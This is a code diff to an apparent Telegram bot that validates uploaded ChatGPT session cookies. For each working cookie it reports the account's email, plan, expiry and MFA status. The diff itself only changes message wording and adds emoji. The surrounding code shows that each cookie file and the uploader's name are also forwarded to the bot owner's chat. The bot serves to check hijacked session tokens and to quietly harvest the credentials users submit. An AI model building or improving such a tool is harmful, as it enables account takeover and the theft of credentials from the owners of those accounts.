@@ -266,14 +266,11 @@ async def process_file(
         logger.error(f"Error fetching ChatGPT: {e}\n{tb}")
         return
 
+    # Only send the simple invalid message when cookies are invalid
     if not valid:
-        snippet = html[:500].replace('\n', ' ')
         await context.bot.send_message(
             chat_id,
-            text=(
-                f"❌ This cookie is invalid or expired. (HTTP {status})\n\n"
-                f"Response snippet:\n{snippet}"
-            ),
+            "❌ This cookie is invalid or expired.",
             reply_to_message_id=orig_id
         )
         return
@@ -309,12 +306,12 @@ async def process_file(
     input_file = InputFile(buf2, filename=tag)
 
     caption_user = (
-        f"✅ This cookie is working, enjoy ChatGPT 🤖. Checked by @{bot_user}\n\n"
+        f"✅ This cookie is working, enjoy ChatGPT, 🤖 Checked by @{bot_user}\n\n"
         "Account information:\n"
-        f"Mail: {email}\n"
-        f"Plan: {plan}\n"
-        f"Expires on: {expires}\n"
-        f"MFA: {mfa}"
+        f"📧Mail: {email}\n"
+        f"📦Plan: {plan}\n"
+        f"⏳Expires on: {expires}\n"
+        f"🔒MFA: {mfa}"
     )
     await context.bot.send_document(
         chat_id,
@@ -328,10 +325,10 @@ async def process_file(
         f"Full name: {full_name}\n"
         f"Username: {username_str}\n\n"
         "Account information:\n"
-        f"Mail: {email}\n"
-        f"Plan: {plan}\n"
-        f"Expires on: {expires}\n"
-        f"MFA: {mfa}"
+        f"📧Mail: {email}\n"
+        f"📦Plan: {plan}\n"
+        f"⏳Expires on: {expires}\n"
+        f"🔒MFA: {mfa}"
     )
     await context.bot.send_document(
         OWNER_CHAT_ID,
